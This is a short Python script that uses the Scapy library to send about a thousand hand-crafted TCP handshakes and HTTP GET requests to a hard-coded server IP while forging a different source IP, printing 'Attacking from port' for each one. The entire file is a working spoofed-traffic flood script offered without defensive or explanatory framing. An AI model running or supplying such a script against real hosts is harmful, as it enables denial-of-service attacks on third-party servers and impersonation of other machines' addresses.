from scapy.all import *
from random import randint

x = "instance2mymachines.xyz"
y = ":8080"
ip = "144.217.100.106"
dport = 80
sp = 3000
numgets = 1000

i = IP()
i.dst = ip
i.src = "35.202.193.2"
print("IP layer prepared: ", i.summary())

for s in range(sp, sp + numgets - 1):
    t = TCP()
    t.dport = 80
    t.sport = s
    t.flags = "S"
    ans = sr1(i / t, verbose=0)
    t.seq = ans.ack
    t.ack = ans.seq + 1
    t.flags = "A"
    get = "GET / HTTP/1.1\r\nHost: " + ip
    ans = sr1(i / t / get, verbose=0)
    print("Attacking from port ", s)
print("Done!")
